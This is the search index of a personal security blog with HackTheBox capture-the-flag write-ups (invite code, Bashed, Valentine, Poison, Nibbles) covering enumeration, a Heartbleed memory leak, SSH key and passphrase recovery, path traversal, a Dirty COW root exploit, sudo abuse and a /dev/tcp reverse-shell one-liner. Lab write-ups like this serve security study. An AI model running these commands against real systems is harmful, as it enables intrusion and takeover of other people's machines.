{
    "docs": [
        {
            "location": "/", 
            "text": "Introduction\n\n\nHi there!\n\n\nI'm Partu a passionate about information security, currently working as Security Researcher at Onapsis.\nI'm also fan of CTF's, specially when challenges about crypto and reversing are present.\n\n\nI wanted to share in some way the little things I do in my spare time, such as tools, CTF write ups, researches, etc.\nHope you enjoy it!\n\n\n@partu18", 
            "title": "Home"
        }, 
        {
            "location": "/#introduction", 
            "text": "Hi there!  I'm Partu a passionate about information security, currently working as Security Researcher at Onapsis.\nI'm also fan of CTF's, specially when challenges about crypto and reversing are present.  I wanted to share in some way the little things I do in my spare time, such as tools, CTF write ups, researches, etc.\nHope you enjoy it!  @partu18", 
            "title": "Introduction"
        }, 
        {
            "location": "/ctfs/hackthebox/registration/", 
            "text": "Registration\n\n\nIn order to join to the platform, you should solve the first challenge.\n\n\nOnce in the \nJOIN\n section, open we are asked to prompt a code. We don't have any code yet, so the first step is to look into the page source to find something. After a digging some time, you will find a link to a JS script: \n/js/inviteapi.min.js\n. After openning and formating it:\n\n\n\neval(\n    function  (p,a,c,k,e,d){\n        e = function(c){return c.toString(36)};\n        if ( !''.replace(/^/,String)){\n            while(c--){\n                d[c.toString(a)] = k[c] || c.toString(a)\n            }\n            k = [function(e){return d[e]}];\n            e = function(){return'\\\\w+'};\n            c = 1\n        };\n        while(c--){\n            if (k[c]){\n                p = p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])\n            }\n        }\n        return p    \n    }\n    ('1 i(4){h 8={\n4\n:4};$.9({a:\n7\n,5:\n6\n,g:8,b:\\'/d/e/n\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:\n7\n,5:\n6\n,b:\\'/d/e/k/l/m\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',\n    24,\n    24,\n    'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),\n    0,\n    {}\n    )\n)\n\n\n\n\n\nSo basically, it's a JS functiont that it's being called with some specific parameters.\n\n\nIt's not necessary to fully understand the whole thing, we can just use the Chrome/Firefox JS console and make use of this code. Nevertheless, if you copy \n paste it, it won't work due to a name for the function is missing. What I did was just to choose some name, copy only the part of the function definition an afterwards call it with the specific parameters:\n\n\n\n\nThe answer gathered is again JS code:\n\n\n\nfunction verifyInviteCode(code){\n    var formData = {\ncode\n:code};\n    $.ajax({\n        type:\nPOST\n,\n        dataType:\njson\n,\n        data:formData,url:'/api/invite/verify',\n        success:function(response){\n            console.log(response)\n        },\n        error:function(response){\n            console.log(response)\n        }\n    })\n}\n\nfunction makeInviteCode(){\n    $.ajax({\n        type:\nPOST\n,\n        dataType:\njson\n,\n        url:'/api/invite/how/to/generate',\n        success:function(response){\n            console.log(response)\n        },\n        error:function(response){\n            console.log(response)\n        }\n    })\n}\n\n\n\n\n\nThis time seems to show us how the \nInviteCode\n related functions are invoked... Time to use \nburp\n:\n\n\nIssuing the following POST we will receive an answer with some information encoded: \n\n\n\nPOST /api/invite/how/to/generate HTTP/1.1\nHost: www.hackthebox.eu\nConnection: close\nAccept: */*\n\n\n\n\n\n\n{\nsuccess\n:1,\ndata\n:{\ndata\n:\nSW4gb3JkZXIgdG8gZ2VuZXJhdGUgdGhlIGludml0ZSBjb2RlLCBtYWtlIGEgUE9TVCByZXF1ZXN0IHRvIC9hcGkvaW52aXRlL2dlbmVyYXRl\n,\nenctype\n:\nBASE64\n},\n0\n:200}\n\n\n\n\n\nAfter decoding the value inside \ndata\n which is encoded with the encoding mentioned in \nenctype\n, you'll get the a message saying:\n\nIn order to generate the invite code, make a POST request to /api/invite/generate\n\n\nSo, let folow their order:\n\n\n\nPOST /api/invite/generate HTTP/1.1\nHost: www.hackthebox.eu\nConnection: close\nAccept: */*\n\n\n\n\n\n\n{\nsuccess\n:1,\ndata\n:{\ncode\n:\nWElLQVktWFlFWk8tTkpaTEotVVNFQVMtWkJBTE4=\n,\nformat\n:\nencoded\n},\n0\n:200}\n\n\n\n\n\nAnd here it is.. Our \ncode\n is encoded in base64. Once decoded you'll get your code:\n\n\nXIKAY-XYEZO-NJZLJ-USEAS-ZBALN\n (in my case).\n\n\nDisclaimer\n\n\nI did the challenge again for the write up because I forgot to do it the first time.\nThis time, the code worked perfectly once I typed it. But the first time I did the challenge I remember that I wasn't able to use the code retrieved, and some error saying something about \"This IP can't use the code\" was triggered. I solved it just connecting through a VPN.", 
            "title": "Initial registration to HTB"
        }, 
        {
            "location": "/ctfs/hackthebox/registration/#registration", 
            "text": "In order to join to the platform, you should solve the first challenge.  Once in the  JOIN  section, open we are asked to prompt a code. We don't have any code yet, so the first step is to look into the page source to find something. After a digging some time, you will find a link to a JS script:  /js/inviteapi.min.js . After openning and formating it:  \neval(\n    function  (p,a,c,k,e,d){\n        e = function(c){return c.toString(36)};\n        if ( !''.replace(/^/,String)){\n            while(c--){\n                d[c.toString(a)] = k[c] || c.toString(a)\n            }\n            k = [function(e){return d[e]}];\n            e = function(){return'\\\\w+'};\n            c = 1\n        };\n        while(c--){\n            if (k[c]){\n                p = p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])\n            }\n        }\n        return p    \n    }\n    ('1 i(4){h 8={ 4 :4};$.9({a: 7 ,5: 6 ,g:8,b:\\'/d/e/n\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a: 7 ,5: 6 ,b:\\'/d/e/k/l/m\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',\n    24,\n    24,\n    'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),\n    0,\n    {}\n    )\n)  So basically, it's a JS functiont that it's being called with some specific parameters.  It's not necessary to fully understand the whole thing, we can just use the Chrome/Firefox JS console and make use of this code. Nevertheless, if you copy   paste it, it won't work due to a name for the function is missing. What I did was just to choose some name, copy only the part of the function definition an afterwards call it with the specific parameters:   The answer gathered is again JS code:  \nfunction verifyInviteCode(code){\n    var formData = { code :code};\n    $.ajax({\n        type: POST ,\n        dataType: json ,\n        data:formData,url:'/api/invite/verify',\n        success:function(response){\n            console.log(response)\n        },\n        error:function(response){\n            console.log(response)\n        }\n    })\n}\n\nfunction makeInviteCode(){\n    $.ajax({\n        type: POST ,\n        dataType: json ,\n        url:'/api/invite/how/to/generate',\n        success:function(response){\n            console.log(response)\n        },\n        error:function(response){\n            console.log(response)\n        }\n    })\n}  This time seems to show us how the  InviteCode  related functions are invoked... Time to use  burp :  Issuing the following POST we will receive an answer with some information encoded:   \nPOST /api/invite/how/to/generate HTTP/1.1\nHost: www.hackthebox.eu\nConnection: close\nAccept: */*  \n{ success :1, data :{ data : SW4gb3JkZXIgdG8gZ2VuZXJhdGUgdGhlIGludml0ZSBjb2RlLCBtYWtlIGEgUE9TVCByZXF1ZXN0IHRvIC9hcGkvaW52aXRlL2dlbmVyYXRl , enctype : BASE64 }, 0 :200}  After decoding the value inside  data  which is encoded with the encoding mentioned in  enctype , you'll get the a message saying: In order to generate the invite code, make a POST request to /api/invite/generate  So, let folow their order:  \nPOST /api/invite/generate HTTP/1.1\nHost: www.hackthebox.eu\nConnection: close\nAccept: */*  \n{ success :1, data :{ code : WElLQVktWFlFWk8tTkpaTEotVVNFQVMtWkJBTE4= , format : encoded }, 0 :200}  And here it is.. Our  code  is encoded in base64. Once decoded you'll get your code:  XIKAY-XYEZO-NJZLJ-USEAS-ZBALN  (in my case).", 
            "title": "Registration"
        }, 
        {
            "location": "/ctfs/hackthebox/registration/#disclaimer", 
            "text": "I did the challenge again for the write up because I forgot to do it the first time.\nThis time, the code worked perfectly once I typed it. But the first time I did the challenge I remember that I wasn't able to use the code retrieved, and some error saying something about \"This IP can't use the code\" was triggered. I solved it just connecting through a VPN.", 
            "title": "Disclaimer"
        }, 
        {
            "location": "/ctfs/hackthebox/bashed/", 
            "text": "Bashed\n\n\nUser\n\n\nThis machine was pretty easy.\nFirst of all I used \ndirb\n to start listing some common directories.\n\n\n\ndirb http://10.10.10.68 common.txt\n\n\n\n\n\nSome directories were found:\n\n\n\n\nThe \ndev\n seemed to be the most interesting one, therefore I started from there:\n\n\n\n\nAnd once inside \nphpbash.php\n:\n\n\n\n\nRoot\n\n\nTBD", 
            "title": "Bashed"
        }, 
        {
            "location": "/ctfs/hackthebox/bashed/#bashed", 
            "text": "", 
            "title": "Bashed"
        }, 
        {
            "location": "/ctfs/hackthebox/bashed/#user", 
            "text": "This machine was pretty easy.\nFirst of all I used  dirb  to start listing some common directories.  \ndirb http://10.10.10.68 common.txt  Some directories were found:   The  dev  seemed to be the most interesting one, therefore I started from there:   And once inside  phpbash.php :", 
            "title": "User"
        }, 
        {
            "location": "/ctfs/hackthebox/bashed/#root", 
            "text": "TBD", 
            "title": "Root"
        }, 
        {
            "location": "/ctfs/hackthebox/valentine/", 
            "text": "Valentine (User \n root)\n\n\nUser\n\n\nSo, in order to start, as always, I used \nnmap\n:\n\n\n\n\nSSH\n, \nHTTP\n, \nHTTPS\n. Let's navigate the web servers while we wait for \ndirb\n again.\n\n\nThe index of both webservers is an image of a woman like shouting and the logo of \nheartbleed\n:\n\n\n\n\nFrom last machine I learn that inside \n/dev/\n something could appear. Let's try...:\n\n\n\n\nWell, that was lucky. Inside the \nnotes.txt\n there isn't anything interesting, but inside \nhype_key\n, there is some \nencoded\n text. Seems to be printable hex, so let's try to decode it: \nhex to ascii\n\n\n-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46\n\nDbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R\n5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6\n0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi\nEbw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P\nOXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd\npHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH\nQdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E\np0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC\nOl6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO\nt9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5\nXqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK\naAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ\n+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E\nAloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q\nr08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe\n2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky\ne1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP\n09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC\ndYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX\ncY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY\npnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj\nMslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL\nsuLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW\nl0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT\nRUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3\n-----END RSA PRIVATE KEY-----\n\n\n\n\n\nNice! We have a private key... but what for? Maybe to login by \nssh\n? We still need the passphrase for it... \nI was expecting that \ndirb\n helped me with the output, but .. unfortunately, it didn't helped me. There were some \nphp\n scrips that seemed to encode/decode base64, but nothing else (well, it has the \n/dev\n directory):\n\n\n\n\nThen, I remembered that there was also an HTTPS server and due to the fact that this image is showing us the logo of hearbleed... maybe we can use the heartbleed exploit to gather information from there?\nTo perform this part I used \nMetasploit\n because it already had a \nmodule\n to do it. The usage was pretty straighforward, and after a couple of seconds I had some memory samples:\n\n\n\n\n\n\nAfter analzing these samples, I found a very interesting thing. There was an HTTP request there:\n\n\n\n\nIt was using one the \n.php\n scripts that we found thanks to \ndirb\n, which was \ndecode.php\n.. Let's try to decode it:\n\n\n\n\nYEAH!\n seems we have something usefull here. We have an RSA Private key and now we have something that seems to be a passphrase, but..how can we ensure that this is the correct passphrase?\n\n\nIn order to ensure it, I issued the following command\n\n\nssh-keygen -y -f rsa_key.pem\n\n\n\n\nwith \nrsa_key.pem\n being the private RSA key.  This command will extract the publick key from the PEM, only if we have the correct passphrase. You, after executing it, and typing the passphrase \nheartbleedbelievethehype\n the public key was successfully created.\n\n\nSo far we have the PEM and the passphrase for it. My main idea is that this should be used to connect to the server via \nSSH\n. But still, we don't know the user. I spent a \nLOOOONGG\n time thinking that I wasn't issuing a right command to connect using the PEM, but the problem was not the command but the user. I thought that \nvalentine\n had to be the correct one. After a couple of hours (yes, hours) I realize that maybe the user wasn't that one...\n\n\nI spent lot of time trying to find the correct user:\n\n\n\n\nLooking on new samples of memory gathered by exploiting heartbleed.\n\n\nLooking in the page source code of the pages hosted in the HTTP Server.\n\n\nTrying with common users (guest, www-data, etc).\n\n\nAmong others.\n\n\n\n\nFinally, two of my neurons did synapsis and I realized that the file where I found the encoded RSA private key, was called \nhype_key\n. So I literally ran to type the following command, which \nfortunately\n gave me access to the machine.\n\n\nssh -v -i rsa_key.pem hype@10.10.10.79\n\n\n\n\nOnce inside, it was just needed to go to the home directory of this user, and find the \nuser.txt\n file with the hash inside.\n\n\nRoot\n\n\nI copied the \nLinEnum.sh\n file to the vm, and made a scan but the path finally wasn't that one.\nI wanted to know the Kerknel version so figure it out if there was some exploit for it. then I issued the command:\n\n\nuname -a \nLinux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux\n\n\n\n\nSo yeah, the Kernel seemed to be pretty old. I tried with 4 different exploits, two related with the vulnerability on \nperf_swevent_init\n and other two related to \ndity cow\n. Unfortunately, there didn't work (don't know why, specially the latest).\n\n\nFinally, I found some \nvideo\n explaining how to use a variant of \ndirty cow\n to modify the \n/etc/passwd/\n file in order to create a new user with id 0 (root privileges). \nExploit\n\n\nThe exploit was very straighforwad to use, the only thing I had to change was the value of the salt, for my current user. Afterwards, I was able to run the script. Once it was running, I connected to the system with another shell using the new username and the password that was asked me to set.", 
            "title": "Valentine"
        }, 
        {
            "location": "/ctfs/hackthebox/valentine/#valentine-user-root", 
            "text": "", 
            "title": "Valentine (User &amp; root)"
        }, 
        {
            "location": "/ctfs/hackthebox/valentine/#user", 
            "text": "So, in order to start, as always, I used  nmap :   SSH ,  HTTP ,  HTTPS . Let's navigate the web servers while we wait for  dirb  again.  The index of both webservers is an image of a woman like shouting and the logo of  heartbleed :   From last machine I learn that inside  /dev/  something could appear. Let's try...:   Well, that was lucky. Inside the  notes.txt  there isn't anything interesting, but inside  hype_key , there is some  encoded  text. Seems to be printable hex, so let's try to decode it:  hex to ascii  -----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46\n\nDbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R\n5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6\n0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi\nEbw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P\nOXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd\npHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH\nQdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E\np0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC\nOl6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO\nt9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5\nXqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK\naAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ\n+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E\nAloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q\nr08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe\n2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky\ne1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP\n09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC\ndYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX\ncY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY\npnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj\nMslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL\nsuLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW\nl0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT\nRUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3\n-----END RSA PRIVATE KEY-----  Nice! We have a private key... but what for? Maybe to login by  ssh ? We still need the passphrase for it... \nI was expecting that  dirb  helped me with the output, but .. unfortunately, it didn't helped me. There were some  php  scrips that seemed to encode/decode base64, but nothing else (well, it has the  /dev  directory):   Then, I remembered that there was also an HTTPS server and due to the fact that this image is showing us the logo of hearbleed... maybe we can use the heartbleed exploit to gather information from there?\nTo perform this part I used  Metasploit  because it already had a  module  to do it. The usage was pretty straighforward, and after a couple of seconds I had some memory samples:    After analzing these samples, I found a very interesting thing. There was an HTTP request there:   It was using one the  .php  scripts that we found thanks to  dirb , which was  decode.php .. Let's try to decode it:   YEAH!  seems we have something usefull here. We have an RSA Private key and now we have something that seems to be a passphrase, but..how can we ensure that this is the correct passphrase?  In order to ensure it, I issued the following command  ssh-keygen -y -f rsa_key.pem  with  rsa_key.pem  being the private RSA key.  This command will extract the publick key from the PEM, only if we have the correct passphrase. You, after executing it, and typing the passphrase  heartbleedbelievethehype  the public key was successfully created.  So far we have the PEM and the passphrase for it. My main idea is that this should be used to connect to the server via  SSH . But still, we don't know the user. I spent a  LOOOONGG  time thinking that I wasn't issuing a right command to connect using the PEM, but the problem was not the command but the user. I thought that  valentine  had to be the correct one. After a couple of hours (yes, hours) I realize that maybe the user wasn't that one...  I spent lot of time trying to find the correct user:   Looking on new samples of memory gathered by exploiting heartbleed.  Looking in the page source code of the pages hosted in the HTTP Server.  Trying with common users (guest, www-data, etc).  Among others.   Finally, two of my neurons did synapsis and I realized that the file where I found the encoded RSA private key, was called  hype_key . So I literally ran to type the following command, which  fortunately  gave me access to the machine.  ssh -v -i rsa_key.pem hype@10.10.10.79  Once inside, it was just needed to go to the home directory of this user, and find the  user.txt  file with the hash inside.", 
            "title": "User"
        }, 
        {
            "location": "/ctfs/hackthebox/valentine/#root", 
            "text": "I copied the  LinEnum.sh  file to the vm, and made a scan but the path finally wasn't that one.\nI wanted to know the Kerknel version so figure it out if there was some exploit for it. then I issued the command:  uname -a \nLinux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux  So yeah, the Kernel seemed to be pretty old. I tried with 4 different exploits, two related with the vulnerability on  perf_swevent_init  and other two related to  dity cow . Unfortunately, there didn't work (don't know why, specially the latest).  Finally, I found some  video  explaining how to use a variant of  dirty cow  to modify the  /etc/passwd/  file in order to create a new user with id 0 (root privileges).  Exploit  The exploit was very straighforwad to use, the only thing I had to change was the value of the salt, for my current user. Afterwards, I was able to run the script. Once it was running, I connected to the system with another shell using the new username and the password that was asked me to set.", 
            "title": "Root"
        }, 
        {
            "location": "/ctfs/hackthebox/poison/", 
            "text": "Poison\n\n\nUser\n\n\nSo, started with the usual nmap command: \n\n\n\nWe have a lot of things to attack. Let's start with the http. \n\n\nFirst page ask you to choose one script.. Let's took \nlistfiles.php\n...\n\n\n\n\n\n\nThe answer back is an Array object with each file that is inside that folder.. If we pay attention there is one called \npwdbackup.txt\n. I'd like to read it.. so.. what happens if we change the file param of the url? \n\n\n\n\nGreat... Now.. encoded at least 13 times, pretty easy to noticed that the encode is base64, so let's decoded. I developed a very simple script:\n\n\nimport base64 \n\npassword = \nVm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo=\n\n\nfor _ in xrange(13):\n    password = base64.decodestring(password)\n\nprint password\n\n\n\n\nOnce executed.. the answer is: \nCharix!2#4%6\n8(0\n.\nOk maybe this could be a password for something.. maybe ssh, maybe vnc? Anyways, we are missing the user. How could we get the user?. \nWhat if we use again the path traversal vuln?:\n\n\n\n\nPerfect. There is a user called \ncharix\n, due to the password has also that string, I guess is the correct user for our password.\nLet's try an ssh connection: \n\n\n\n\nRoot\n\n\nOk, once I started using \nLinEnum.sh\n, looking for filesystem files, doing enumeration basically. The first thing, is the \nsecret.zip\n file which is placed in the home of charix. \n\n\nI copied to my local machine and tried to bruteforce it with JTR, but no luck at all. Then I tried to use the same password as the user of charix and worked!. Anyways, the file is very strange, is just ascii text maybe encoded or encrypted or corrupted. At this moment I thought it was just a troll. \n\n\nThen, I continued enumerating and discovered some processes running as root listeining only in localhost: \n\n\n\n\nIn particular, \nXvnc\n and \nsendmail\n sound weird for me to be running as root. Due to I didn't have any idea of what sendmail was, I started looking for vnc. \n\n\nSo I looked for some commands in the machine (just pressing vnc\n) and found \nvncpasswd\n. Once I ran it, a message telling me which password file was using appeared. So I went to look for that file, and get the following:\n\n\n\n\nSo, after \"catting\" I realise that was more or less the same format as the file that I already decompressed from the ZIP. \nSo then I went to the internet to try to see if this format was already broken or if there was some tool to let you read the password in plain text from this file. And... yes! there was \none\n.\n\n\nAfter using it, get the password \nVNCP@$$!\n.\n\n\nThis probably is the password of root (or toor, there are two users with id 0). I tried them first with ssh, but it didn't work. Clearly, was the VNC password, but I had to test it anyways.\n\n\nAt this moment I totally forgot that my nmap had discovered a VNC open port, so I spend more than an hour trying to figure it out how how to initiate a connection from the machine itself to this server that was only listening in the localhost. Finally, I did something different. I used ssh, to make a port forwarding from my local machine to a port of the local port 5901 of the remote machine, by ussing the following command:\n\n\nssh -L 5901:127.0.0.1:5901 -N -f -l Charix 10.10.10.84\n\n\n\n\nOnce I made that connection, using remmina, the root user and the password found, I was able to get the flag: \n\n\n\n\n\nYEAH! I had to copy it char by char xD.\n\n\nNibbles (User \n Rooted)\n\n\nUser\n\n\nReading comments. Found\n\n\n!-- /nibbleblog/ directory. Nothing interesting here! --\n\n\n\n\n\nRan dirbuster against http://10.10.10.75/nibbleblog/ \nFound \nadmin.php\n.\n\n\nTried with some default credentials:\n\n\n\n\nadmin:admin\n\n\nnibbles:nibbles\n\n\nadmin:nibbles \n(GOT IT!)\n\n\n\n\nTried to look for a LFI in some upload of images (new page, new post) without luck..\n\n\nSearch in google for nibbleblog: \nIt is a well-known CMS!\n.. Looking for exploit: YEAH! INside \nMSF\n.\n\n\nRun the exploit:\n\n\n\n\nOnce with the meterpreter.\n\n\ncat /etc/passsd\n\n\n\n\nShowed me, that there was only one user interesting called \nnibbler\n.\n\n\nwhoami\n\n\n\n\nreturned also \nnibbler\n.\n\n\nWent to /home/nibbler and...:\n\n\n\nRoot\n\n\nSo, first step was to create a reverse shell.. In order to do that I did:\n\n\n On my local machine \n\n\nsudo ufw allow 3333\nnc -lnvp 3333\n\n\n\n\n On the remote machine\n\n\nbash -i\nbash -i \n /dev/tcp/IP/3333 0\n1\n\n\n\n\n\n\nOnce I have the reverse shell in my local pc, I \"upgraded\" to a full tty (I learned this trick by looking this \nvideo\n).\n\n\nSo next step was use the \nLinEnum.sh\n. I found it already in the vm, but othrwise uploading in it to the vm wouldn't be a problem at all (wget to some http server or some other way).\n\n\nOnce I ran it, one of the outputs was:\n\n\nUser nibbler may run the following commands on Nibbles:\n    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh\n\n[+] Possible sudo pwnage!\n-rwxrwxrwx 1 nibbler nibbler 21 May  1 19:01 /home/nibbler/personal/stuff/monitor.sh\n\n\n\n\nThis basicall means that there is a misconfiguration in the \n/etc/sudoers\n file which allows the user \nnibbler\n to execute any \nmonitor.sh\n as root, without prompting any password. So my next step was simply:\n\n\necho \ncat /root/root.txt\n \n /home/nibbler/personal/stuff/monitor.sh\nsudo /home/nibbler/personal/stuff/monitor.sh\n\n\n\n\nIt's extremely important to run the the sudo comand not with the relative path, but with the absolute one. Because that's how sudo works\n\n\nThe output was the flag =):", 
            "title": "Poison"
        }, 
        {
            "location": "/ctfs/hackthebox/poison/#poison", 
            "text": "", 
            "title": "Poison"
        }, 
        {
            "location": "/ctfs/hackthebox/poison/#user", 
